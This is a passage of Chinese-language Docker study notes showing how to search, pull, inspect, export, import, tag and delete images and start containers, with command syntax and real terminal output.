#查看下载的镜像
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB




#查看镜像分层历史
[root@centos7 ~]# docker image history nginx
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
605c77e624dd        7 months ago        /bin/sh -c #(nop)  CMD ["nginx" "-g" "daemon…   0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  STOPSIGNAL SIGQUIT           0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  EXPOSE 80                    0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  ENTRYPOINT ["/docker-entr…   0B                  
<missing>           7 months ago        /bin/sh -c #(nop) COPY file:09a214a3e07c919a…   4.61kB              
<missing>           7 months ago        /bin/sh -c #(nop) COPY file:0fd5fca330dcd6a7…   1.04kB              
<missing>           7 months ago        /bin/sh -c #(nop) COPY file:0b866ff3fc1ef5b0…   1.96kB              
<missing>           7 months ago        /bin/sh -c #(nop) COPY file:65504f71f5855ca0…   1.2kB               
<missing>           7 months ago        /bin/sh -c set -x     && addgroup --system -…   61.1MB              
<missing>           7 months ago        /bin/sh -c #(nop)  ENV PKG_RELEASE=1~bullseye   0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  ENV NJS_VERSION=0.7.1        0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  ENV NGINX_VERSION=1.21.5     0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  LABEL maintainer=NGINX Do…   0B                  
<missing>           7 months ago        /bin/sh -c #(nop)  CMD ["bash"]                 0B                  
<missing>           7 months ago        /bin/sh -c #(nop) ADD file:09675d11695f65c55…   80.4MB 


#查看镜像分层
[root@centos7 ~]# docker inspect nginx
[
    {
        "Id": "sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85",
        "RepoTags": [
            "nginx:latest"
        ],
        "RepoDigests": [
            "nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31"
        ],
        "Parent": "",
        "Comment": "",
        "Created": "2021-12-29T19:28:29.892199479Z",
        "Container": "ca3e48389f7160bc9d9a892d316fcbba459344ee3679998739b1c3cd8e56f7da",
        "ContainerConfig": {
            "Hostname": "ca3e48389f71",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.21.5",
                "NJS_VERSION=0.7.1",
                "PKG_RELEASE=1~bullseye"
            ],
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"nginx\" \"-g\" \"daemon off;\"]"
            ],
            "Image": "sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>"
            },
            "StopSignal": "SIGQUIT"
        },
        "DockerVersion": "20.10.7",
        "Author": "",
        "Config": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.21.5",
                "NJS_VERSION=0.7.1",
                "PKG_RELEASE=1~bullseye"
            ],
            "Cmd": [
                "nginx",
                "-g",
                "daemon off;"
            ],
            "Image": "sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>"
            },
            "StopSignal": "SIGQUIT"
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 141479488,
        "VirtualSize": 141479488,
        "GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/0ca3f6138f3ab7b524527ec9ffafd881c33fab33a959b170d00086cc4e9c06d1/diff:/var/lib/docker/overlay2/679ae309f9eff94f2ce3da14a0b1eef6f207ae8fad24767f99149ae1ad4f4349/diff:/var/lib/docker/overlay2/5cbbcb29339672f8310a5c06ee0305af1431dbff3a29c5f34d38c0f9506249b5/diff:/var/lib/docker/overlay2/21075c796eb244571847a35ccc2f77acdfd82c506599990974490405e6b76a0c/diff:/var/lib/docker/overlay2/82d34d5e58bc749434dc45a03cd33cb8a2f193f4cd82e9c4dde11ea7030ba791/diff",
                "MergedDir": "/var/lib/docker/overlay2/a97716bfe184ebe4280ca6eb9ab878737f5e37fde8f5444244d41c449aba1ec3/merged",
                "UpperDir": "/var/lib/docker/overlay2/a97716bfe184ebe4280ca6eb9ab878737f5e37fde8f5444244d41c449aba1ec3/diff",
                "WorkDir": "/var/lib/docker/overlay2/a97716bfe184ebe4280ca6eb9ab878737f5e37fde8f5444244d41c449aba1ec3/work"
            },
            "Name": "overlay2"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [   #这里也可以看到分层！！！
                "sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f",
                "sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8",
                "sha256:b8d6e692a25e11b0d32c5c3dd544b71b1085ddc1fddad08e68cbd7fda7f70221",
                "sha256:f1db227348d0a5e0b99b15a096d930d1a69db7474a1847acbc31f05e4ef8df8c",
                "sha256:32ce5f6a5106cc637d09a98289782edf47c32cb082dc475dd47cbf19a4f866da",
                "sha256:d874fd2bc83bb3322b566df739681fbd2248c58d3369cb25908d68e7ed6040a6"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]                                                                         0 
```

##### 48.5.6.2 搜索镜像

**执行docker search命令进行搜索**

```
格式如下:
Usage: docker search [OPTIONS] TERM

Options:
  -f, --filter filter   Filter output based on conditions provided
      --format string   Pretty-print search using a Go template
      --limit int       Max number of search results (default 25)
      --no-trunc       Don't truncate output
      
说明:  
OFFICIAL: 官方
AUTOMATED: 使用第三方docker服务来帮助编译镜像，可以在互联网上面直接拉取到镜像，减少了繁琐的编译过程
```

**范例:** 

```
#搜索centos镜像
[root@centos7 ~]# docker search centos
NAME                                         DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED
centos                                       The official build of CentOS.                   7264                [OK]                
kasmweb/centos-7-desktop                     CentOS 7 desktop for Kasm Workspaces            22                                      
continuumio/centos5_gcc5_base                                                                3                                       
kasmweb/core-centos-7                        CentOS 7 base image for Kasm Workspaces         3                                       
dokken/centos-7                              CentOS 7 image for kitchen-dokken               2                                       
spack/centos7                                CentOS 7 with Spack preinstalled                1                                       
dokken/centos-stream-9                                                                       1                                       
couchbase/centos7-systemd                    centos7-systemd images with additional debug…   1                                       [OK]
couchbase/centos-72-java-sdk                                                                 0                                       
dokken/centos-6                              CentOS 6 image for kitchen-dokken               0                                       
spack/centos6                                CentOS 6 with Spack preinstalled                0                                       
dokken/centos-stream-8                                                                       0                                       
bitnami/centos-base-buildpack                Centos base compilation image                   0                                       [OK]
corpusops/centos                             centos corpusops baseimage                      0                                       
dokken/centos-8                              CentOS 8 image for kitchen-dokken               0                                       
couchbase/centos-72-jenkins-core                                                             0                                       
fnndsc/centos-python3                        Source for a slim Centos-based Python3 image…   0                                       [OK]
bitnami/centos-extras-base                                                                   0                                       
couchbase/centos-69-sdk-build                                                                0                                       
couchbase/centos-70-sdk-build                                                                0                                       
couchbase/centos-69-sdk-nodevtoolset-build                                                   0                                       
spack/centos-stream                                                                          0                                       
galaxy/centos-wheel                                                                          0                                       
galaxy/centos32                                                                              0                                       
datadog/centos-i386 
```

**范例: 选择性的查找镜像**

```
#搜索点赞100个以上的镜像
[root@centos7 ~]# docker search --filter=stars=100 centos
NAME                DESCRIPTION                     STARS               OFFICIAL            AUTOMATED
centos              The official build of CentOS.   7264
```

##### 48.5.6.3 alpine换阿里源

```
#修改源替换成阿里源，将里面dl-cdn.alpinelinux.org 的改成mirrors.aliyun.com
vi /etc/apk/repositories
http://mirrors.aliyun.com/alpine/v3.12/main/
http://mirrors.aliyun.com/alpine/v3.12/community/


#更新源
apk update

#安装软件
apk add vim

#删除软件
apk del openssh openntp vim
```

##### 48.5.6.4 下载镜像

**命令格式如下:** 

```
docker pull [OPTIONS] NAME[:TAG|@DIGEST]
Options:
  -a, --all-tags               Download all tagged images in the repository
      --disable-content-trust   Skip image verification (default true)
      --platform string         Set platform if server is multi-platform capable
  -q, --quiet                   Suppress verbose output
  
  
NAME: 是镜像名,一般的形式 仓库服务器:端口/项目名称/镜像名称
:TAG: 即版本号,如果不指定:TAG,则下载最新版镜像
```

**镜像下载说明**

```
#注意: 镜像下载完成后，会自动解压缩，比官网显示的可能会大很多，如: centos8.1.1911下载时只有70MB，下载完后显示237MB

[root@ubuntu1804 ~]#docker pull hello-world
Using default tag: latest   #默认下载最新版本
latest: Pulling from library/hello-world
1b930d010525: Pull complete  #分层下载
Digest: sha256:9572f7cdcee8591948c2963463447a53466950b3fc15a247fcad1917ca215a2f 
#摘要
Status: Downloaded newer image for hello-world:latest
docker.io/library/hello-world:latest  #下载的完整地址
```

**镜像下载保存的路径:** 

```
/var/lib/docker/overlay2/镜像ID
```

**范例: 指定 TAG下载特定版本的镜像**

```
[root@ubuntu1804 ~]#docker pull docker.io/library/mysql:5.7.29
[root@centos7 ~]# docker pull mysql:5.7.29
5.7.29: Pulling from library/mysql
804555ee0376: Pull complete 
c53bab458734: Pull complete 
ca9d72777f90: Pull complete
2d7aad6cb96e: Pull complete 
8d6ca35c7908: Pull complete 
6ddae009e760: Pull complete 
327ae67bbe7b: Pull complete 
9e05241b7707: Pull complete 
e822978df8f0: Pull complete 
14ca71ed53be: Pull complete 
026afe6fd35e: Pull complete 
Digest: sha256:2ca675966612f34b4036bbcfa68cb049c03e34b561fba0f88954b03931823d29
Status: Downloaded newer image for mysql:5.7.29
docker.io/library/mysql:5.7.29
```

**范例: 指定DIGEST下载特定版本的镜像**

![1659353512728](linux体系.assets/1659353512728.png)

```
[root@ubuntu1804 ~]#docker pull 
alpine@sha256:156f59dc1cbe233827642e09ed06e259ef6fa1ca9b2e29d52ae14d5e7b79d7f0
sha256:156f59dc1cbe233827642e09ed06e259ef6fa1ca9b2e29d52ae14d5e7b79d7f0: Pulling from library/alpine
5d2415897100: Pull complete 
Digest: sha256:156f59dc1cbe233827642e09ed06e259ef6fa1ca9b2e29d52ae14d5e7b79d7f0
Status: Downloaded newer image for
alpine@sha256:156f59dc1cbe233827642e09ed06e259ef6fa1ca9b2e29d52ae14d5e7b79d7f0
docker.io/library/alpine@sha256:156f59dc1cbe233827642e09ed06e259ef6fa1ca9b2e29d52ae14d5e7b79d7f0


[root@ubuntu1804 ~]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
alpine             <none>             3c791e92a856        3 weeks ago         
5.57MB
```

##### 48.5.6.5 查看本地镜像

```
#docker images 可以查看下载至本地的镜像
格式:
docker images [OPTIONS] [REPOSITORY[:TAG]]
docker image ls [OPTIONS] [REPOSITORY[:TAG]]

#常用选项:  
-q, --quiet     Only show numeric IDs
-a, --all Show all images (default hides intermediate images)
    --digests       Show digests
    --no-trunc     Don't truncate output
-f, --filter filter   Filter output based on conditions provided
    --format string   Pretty-print images using a Go template
```

**执行结果的显示信息说明:**

```
REPOSITORY      #镜像所属的仓库名称
TAG             #镜像版本号（标识符），默认为latest
IMAGE ID        #镜像唯一ID标识,如果ID相同,说明是同一个镜像有多个名称
CREATED         #镜像在仓库中被创建时间
VIRTUAL SIZE    #镜像的大小



Repository仓库
由某特定的docker镜像的所有迭代版本组成的镜像仓库。
一个Registry中可以存在多个Repository。
Repository可分为“顶层仓库”和“用户仓库”。
Repository用户仓库名称一般格式为“用户名/仓库名”。
每个Repository仓库可以包含多个Tag(标签),每个标签对应一个镜像。
```

**范例：**

```
#查看下载镜像全部信息
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB
mysql               5.7.29              5d9483f9a7b2        2 years ago         455MB



#查看下载镜像的IMAGE ID
[root@centos7 ~]# docker images -q
605c77e624dd
feb5d9fea6a5
5d9483f9a7b2



#显示完整的ImageID
[root@centos7 ~]# docker images --no-trunc
REPOSITORY          TAG                 IMAGE ID                                                                  CREATED             SIZE
nginx               latest              sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85   7 months ago        141MB
hello-world         latest              sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412   10 months ago       13.3kB
mysql               5.7.29              sha256:5d9483f9a7b21c87e0f5b9776c3e06567603c28c0062013eda127c968175f5e8   2 years ago         455MB



#只查看指定REPOSITORY的镜像
[root@centos7 ~]# docker images nginx
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB




#查看指定镜像的详细信息
[root@centos7 ~]# docker image inspect nginx
[
    {
        "Id": "sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85",
        "RepoTags": [
            "nginx:latest"
        ],
        "RepoDigests": [
            "nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31"
        ],
        "Parent": "",
        "Comment": "",
        "Created": "2021-12-29T19:28:29.892199479Z",
        "Container": "ca3e48389f7160bc9d9a892d316fcbba459344ee3679998739b1c3cd8e56f7da",
        "ContainerConfig": {
            "Hostname": "ca3e48389f71",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.21.5",
                "NJS_VERSION=0.7.1",
                "PKG_RELEASE=1~bullseye"
            ],
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"nginx\" \"-g\" \"daemon off;\"]"
            ],
            "Image": "sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>"
            },
            "StopSignal": "SIGQUIT"
        },
        "DockerVersion": "20.10.7",
        "Author": "",
        "Config": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.21.5",
                "NJS_VERSION=0.7.1",
                "PKG_RELEASE=1~bullseye"
            ],
            "Cmd": [
                "nginx",
                "-g",
                "daemon off;"
            ],
            "Image": "sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>"
            },
            "StopSignal": "SIGQUIT"
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 141479488,
        "VirtualSize": 141479488,
        "GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/0ca3f6138f3ab7b524527ec9ffafd881c33fab33a959b170d00086cc4e9c06d1/diff:/var/lib/docker/overlay2/679ae309f9eff94f2ce3da14a0b1eef6f207ae8fad24767f99149ae1ad4f4349/diff:/var/lib/docker/overlay2/5cbbcb29339672f8310a5c06ee0305af1431dbff3a29c5f34d38c0f9506249b5/diff:/var/lib/docker/overlay2/21075c796eb244571847a35ccc2f77acdfd82c506599990974490405e6b76a0c/diff:/var/lib/docker/overlay2/82d34d5e58bc749434dc45a03cd33cb8a2f193f4cd82e9c4dde11ea7030ba791/diff",
                "MergedDir": "/var/lib/docker/overlay2/a97716bfe184ebe4280ca6eb9ab878737f5e37fde8f5444244d41c449aba1ec3/merged",
                "UpperDir": "/var/lib/docker/overlay2/a97716bfe184ebe4280ca6eb9ab878737f5e37fde8f5444244d41c449aba1ec3/diff",
                "WorkDir": "/var/lib/docker/overlay2/a97716bfe184ebe4280ca6eb9ab878737f5e37fde8f5444244d41c449aba1ec3/work"
            },
            "Name": "overlay2"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f",
                "sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8",
                "sha256:b8d6e692a25e11b0d32c5c3dd544b71b1085ddc1fddad08e68cbd7fda7f70221",
                "sha256:f1db227348d0a5e0b99b15a096d930d1a69db7474a1847acbc31f05e4ef8df8c",
                "sha256:32ce5f6a5106cc637d09a98289782edf47c32cb082dc475dd47cbf19a4f866da",
                "sha256:d874fd2bc83bb3322b566df739681fbd2248c58d3369cb25908d68e7ed6040a6"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]
```

##### 48.5.6.6 镜像导出导入

**利用docker save命令可以将从本地镜像导出为一个打包 tar文件，然后复制到其他服务器进行导入使用**

```
格式:
docker save [OPTIONS] IMAGE [IMAGE...]
选项:  
-o, --output string   Write to a file, instead of STDOUT


常见用法:
docker save -o /path/file.tar IMAGE1 IMAGE2 ...
docker save IMAGE1 IMAGE2 ... > /path/file.tar
```

**范例: 镜像导出**

```
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB
mysql               5.7.29              5d9483f9a7b2        2 years ago         455MB


[root@centos7 ~]# docker save mysql:5.7.29 alpine:3.11.3 > /data/myimages.tar
或者
[root@centos7 ~]# docker save mysql:5.7.29 alpine:3.11.3 -o /data/myimages.tar
或者
[root@centos7 ~]# docker save nginx > nginx.tar
[root@centos7 ~]# scp nginx.tar 10.0.0.8:
```

**范例:  镜像导入**

```
利用docker load命令可以将镜像导出的压缩文件再导入

格式:
docker load [OPTIONS]
#选项
-i, --input string   Read from tar archive file, instead of STDIN
-q, --quiet         Suppress the load output



#把打包文件导入到images
[root@centos8 ~]# docker load < nginx.tar 
2edcec3590a4: Loading layer [==================================================>]  83.86MB/83.86MB
e379e8aedd4d: Loading layer [==================================================>]     62MB/62MB
b8d6e692a25e: Loading layer [==================================================>]  3.072kB/3.072kB
f1db227348d0: Loading layer [==================================================>]  4.096kB/4.096kB
32ce5f6a5106: Loading layer [==================================================>]  3.584kB/3.584kB
d874fd2bc83b: Loading layer [==================================================>]  7.168kB/7.168kB



[root@centos8 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB




#范例: 一次导出多个镜像
[root@ubuntu1804 ~]#docker save busybox alpine > all.tar
[root@ubuntu1804 ~]#docker load -i all.tar
```

##### 48.5.6.7 删除镜像

```
#docker rmi 命令可以删除本地镜像
格式
docker rmi [OPTIONS] IMAGE [IMAGE...]
docker image rm [OPTIONS] IMAGE [IMAGE...]

#选项:
-f, --force     Force removal of the image
    --no-prune   Do not delete untagged parents
```

**范例:** 

```
#删除nginx镜像
#删除镜像前
[root@centos8 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB


[root@centos8 ~]# docker image rm nginx
Untagged: nginx:latest
Deleted: sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85
Deleted: sha256:b625d8e29573fa369e799ca7c5df8b7a902126d2b7cbeb390af59e4b9e1210c5
Deleted: sha256:7850d382fb05e393e211067c5ca0aada2111fcbe550a90fed04d1c634bd31a14
Deleted: sha256:02b80ac2055edd757a996c3d554e6a8906fd3521e14d1227440afd5163a5f1c4
Deleted: sha256:b92aa5824592ecb46e6d169f8e694a99150ccef01a2aabea7b9c02356cdabe7c
Deleted: sha256:780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5
Deleted: sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f


#删除镜像后
[root@centos8 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB



#删除镜像其他写法
[root@centos7 ~]# docker rmi nginx
[root@centos7 ~]# docker rmi mysql:5.7.29


#删除多个镜像
[root@ubuntu1804 ~]#docker rmi nginx tomcat


#强制删除正在运行的镜像
[root@centos8 ~]# docker image rm -f hello-world
[root@ubuntu1804 ~]#docker rmi centos:centos8.1.1911


#删除所有镜像
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
httpd               latest              dabbfbe0c57b        7 months ago        144MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB


[root@centos7 ~]# docker rmi -f `docker images -q`
Untagged: nginx:latest
Untagged: nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31
Deleted: sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85
Deleted: sha256:b625d8e29573fa369e799ca7c5df8b7a902126d2b7cbeb390af59e4b9e1210c5
Deleted: sha256:7850d382fb05e393e211067c5ca0aada2111fcbe550a90fed04d1c634bd31a14
Deleted: sha256:02b80ac2055edd757a996c3d554e6a8906fd3521e14d1227440afd5163a5f1c4
Deleted: sha256:b92aa5824592ecb46e6d169f8e694a99150ccef01a2aabea7b9c02356cdabe7c
Deleted: sha256:780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5
Untagged: httpd:latest
Untagged: httpd@sha256:0954cc1af252d824860b2c5dc0a10720af2b7a3d3435581ca788dff8480c7b32
Deleted: sha256:dabbfbe0c57b6e5cd4bc089818d3f664acfad496dc741c9a501e72d15e803b34
Deleted: sha256:0e16a5a61bcb4e6b2bb2d746c2d6789d6c0b66198208b831f74b52198d744189
Deleted: sha256:f79670638074ff7fd293e753c11ea2ca0a2d92ab516d2f6b0bac3f4c6fed5d86
Deleted: sha256:189d55cdd18e4501032bb700a511c2d69c82fd75f1b619b5218ea6870e71e4aa
Deleted: sha256:cb038ed3e490a8c0f195cf135ac0d27dd8d3872598b1cb858c2666f2dae95a61
Deleted: sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f
Untagged: hello-world:latest
Untagged: hello-world@sha256:2498fce14358aa50ead0cc6c19990fc6ff866ce72aeb5546e1d59caac3d0d60f
Deleted: sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412



[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE




#删除镜像后
[root@centos8 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB
```

##### 48.5.6.8 镜像打标签

```
#docker tag可以给镜像打标签，类似于起别名,但通常要遵守一定的命名规范,才可以上传到指定的仓库
格式:
docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]

#TARGET_IMAGE[:TAG]格式一般形式
仓库主机FQDN或IP[:端口]/项目名(或用户名)/image名字:版本
TAG默认为latest
```

**范例:** 

```
#查看镜像列表
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
httpd               latest              dabbfbe0c57b        7 months ago        144MB



#给镜像打标签
[root@centos7 ~]# docker tag nginx 10.0.0.101/example/nginx:v1.0
[root@centos7 ~]# docker images
REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE
10.0.0.101/example/nginx   v1.0                605c77e624dd        7 months ago        141MB
nginx                      latest              605c77e624dd        7 months ago        141MB
httpd                      latest              dabbfbe0c57b        7 months ago        144MB



#删除打标签的镜像
[root@centos7 ~]# docker rmi 10.0.0.101/example/nginx:v1.0
Untagged: 10.0.0.101/example/nginx:v1.0
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
httpd               latest              dabbfbe0c57b        7 months ago        144MB
```

**命令总结:** 

```
docker search centos
docker pull alpine
docker images
docker save > /opt/centos.tar #centos #导出镜像
docker load -i centos-latest.tar.xz  #导入本地镜像
docker rmi 镜像ID/镜像名称  #删除指定ID的镜像，此镜像对应容器正启动镜像不能被删除，除非将容器全部关闭
```

#### 48.5.7  容器管理

**容器生命周期**

![1659399831908](linux体系.assets/1659399831908.png)

**容器相关命令**

```
[root@ubuntu1804 ~]#docker container 
Usage: docker container COMMAND

Manage containers

Commands:
 attach     Attach local standard input, output, and error streams to a running container
 commit     Create a new image from a container's changes
 cp         Copy files/folders between a container and the local filesystem
 create     Create a new container
 diff       Inspect changes to files or directories on a container's filesystem
 exec       Run a command in a running container
 export     Export a container's filesystem as a tar archive
 inspect     Display detailed information on one or more containers
 kill       Kill one or more running containers
 logs       Fetch the logs of a container
 ls         List containers
 pause       Pause all processes within one or more containers
 port       List port mappings or a specific mapping for the container
 prune       Remove all stopped containers
 rename     Rename a container
 restart     Restart one or more containers
 rm         Remove one or more containers
 run         Run a command in a new container
 start       Start one or more stopped containers
 stats       Display a live stream of container(s) resource usage statistics
 stop       Stop one or more running containers
 top         Display the running processes of a container
 unpause     Unpause all processes within one or more containers
 update     Update configuration of one or more containers
 wait       Block until one or more containers stop, then print their exit codes
 
Run 'docker container COMMAND --help' for more information on a command.
```

##### 48.5.7.1 启动容器

**启动第一个容器**

```
#运行docker的hello world
[root@centos7 ~]# docker run hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
2db29710123e: Already exists 
Digest: sha256:2498fce14358aa50ead0cc6c19990fc6ff866ce72aeb5546e1d59caac3d0d60f
Status: Downloaded newer image for hello-world:latest

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/
 
 
 
 
#查看本地镜像
[root@centos7 ~]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              605c77e624dd        7 months ago        141MB
httpd               latest              dabbfbe0c57b        7 months ago        144MB
hello-world         latest              feb5d9fea6a5        10 months ago       13.3kB



#hello-world是一次性的，执行完就退出了
[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS                          PORTS               NAMES
ac705518536a        hello-world         "/hello"            About a minute ago   Exited (0) About a minute ago                       bold_nightingale
e9ca09040e1a        hello-world         "/hello"            26 hours ago         Exited (0) 26 hours ago                             funny_faraday
fa968053b1a5        hello-world         "/hello"            26 hours ago         Exited (0) 26 hours ago                             hopeful_mayer
b7e0a169db77        hello-world         "/hello"            26 hours ago         Exited (0) 26 hours ago                             blissful_hypatia
bf5a404ac51a        hello-world         "/hello"            26 hours ago         Exited (0) 26 hours ago                             flamboyant_curran
```

**启动容器的流程**

![1659401131223](linux体系.assets/1659401131223.png)

 **启动容器用法**

```
docker run [选项] [镜像名] [shell命令] [参数] 

#选项:  
-i, --interactive   Keep STDIN open even if not attached，通常和-t一起使用
-t, --tty           分配pseudo-TTY，通常和-i一起使用,注意对应的容器必须运行shell才支持进入
-d, --detach         Run container in background and print container ID,台后运行，默认前台
--name string       Assign a name to the container
--h, --hostname string Container host name 
--rm                 Automatically remove the container when it exits
-p, --publish list   Publish a container's port(s) to the host
-P, --publish-all   Publish all exposed ports to random ports
--dns list           Set custom DNS servers
--entrypoint string Overwrite the default ENTRYPOINT of the image
--restart policy  
--privileged         Give extended privileges to container
-e, --env=[] Set environment variables
--env-file=[]       Read in a line delimited file of environment variables
```

**--restart 可以指定四种不同的policy**

![1659401403223](linux体系.assets/1659401403223.png)

```
#默认后台执行，无论退出状态什么样都会自动重启容器
[root@centos7 ~]# docker run -d --name liunginx --restart always httpd
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS               NAMES
